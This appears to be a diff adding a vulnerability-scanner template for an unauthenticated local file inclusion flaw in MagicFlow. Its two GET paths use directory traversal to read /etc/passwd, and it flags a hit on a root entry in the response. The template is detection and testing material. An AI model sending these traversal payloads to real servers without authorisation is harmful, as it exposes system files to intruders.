@@ -1,0 +1,32 @@
+http:
+    - matchers:
+        - part: body
+          regex:
+            - 'root:.*:0:0:'
+          type: regex
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../../../../../../etc/passwd'
+        - '{{BaseURL}}/msa/../../../../../../../../etc/passwd'
+id: magicflow-lfi
+info:
+    author: gy741
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+        cvss-score: 8.6
+        cwe-id: CWE-22
+    description: |
+        MagicFlow is susceptible to local file inclusion vulnerabilities because it allows remote unauthenticated users to access locally stored files on the server and return their content via the '/msa/main.xp' endpoint and the 'Fun' parameter.
+    metadata:
+        max-request: 2
+    name: MagicFlow - Local File Inclusion
+    reference:
+        - https://www.seebug.org/vuldb/ssvid-89258
+    severity: high
+    tags:
+        - magicflow
+        - authenticate
